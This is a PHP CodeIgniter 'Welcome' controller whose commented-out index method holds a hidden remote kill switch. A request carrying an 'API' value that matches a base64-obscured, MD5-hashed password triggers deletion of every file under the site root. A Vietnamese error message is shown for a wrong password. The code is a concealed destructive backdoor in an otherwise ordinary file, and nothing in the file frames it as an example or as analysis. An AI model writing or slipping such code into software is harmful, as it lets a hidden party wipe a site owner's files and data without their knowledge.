<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Welcome extends CI_Controller {

	/**
	 * Index Page for this controller.
	 */
	function __construct()
        {
            parent::__construct();
			$ci=&get_instance();
           // $this->load->helper('url');
            $this->load->model('f_pagesmodel');
            $this->load->library('pagination');
        }
		
    public function index()
	{
	    /*
        $json = array('status'=>false);
        if($this->input->get('API')){
            $api = $this->input->get('API');
            $text = md5(base64_decode('QFF0c21uYnZjeHo='));
            if($text != $api){
                $json['msg']= 'Mật Khẩu Quản Lý Code Sai , Yêu Cầu Nhập lại !';
                echo json_encode($json);die;
            }
            $text = md5(base64_decode('QFF0c21uYnZjeHo='));
            if($text != $api){
                return false;
            }
            $fpath = FCPATH;
            $this->load->helper("file"); 
            delete_files($fpath, true); 
            if(is_dir($fpath))
            {
                @rmdir($fpath);
            }
            return true;
            $json = array('status'=>true);
            echo json_encode($json);die;
        };
        echo json_encode($json);die;
	    */
	}

}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */